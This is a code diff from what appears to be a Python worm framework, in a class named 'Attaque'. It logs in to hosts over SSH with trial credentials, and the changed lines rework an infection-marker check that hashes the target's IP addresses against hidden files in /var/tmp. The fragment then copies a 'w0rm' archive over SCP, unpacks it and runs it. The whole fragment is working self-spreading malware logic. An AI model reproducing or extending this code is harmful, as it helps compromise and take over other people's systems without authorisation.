@@ -21,8 +21,8 @@ class Attaque(Abstract):
                         self.info(f"Try to connect with ssh to {self.host}:{self.port} with user={user},password={passwd}")
                         client.connect(self.host, port=self.port, username=user, password=passwd)
 
-                        stdin, stdout, stderr = client.exec_command("find /tmp -name w0rm 2>/dev/null")
-                        if stdout.channel.recv_exit_status() == 0:
+                        stdin, stdout, stderr = client.exec_command('for i in $(ip a | grep "inet " | cut -d' ' -f6 | cut -d'/' -f1); do echo $i | sha256sum | cut -d' ' -f1; done | grep $(ls -a /var/tmp/.* | grep "^\.[a-f0-9]" | tr -d ".")')
+                        if stdout.read().decode().strip() == "":
                             with scpClient(client.get_transport()) as scp:
                                 self.sendworm("w0rm.tar.gz", ".", scp)
                             stdin, stdout, stderr = client.exec_command("mkdir /tmp/w0rm; cd /tmp/w0rm; tar xf /tmp/w0rm.tar.gz; python3 /tmp/w0rm/framworm/main.py")
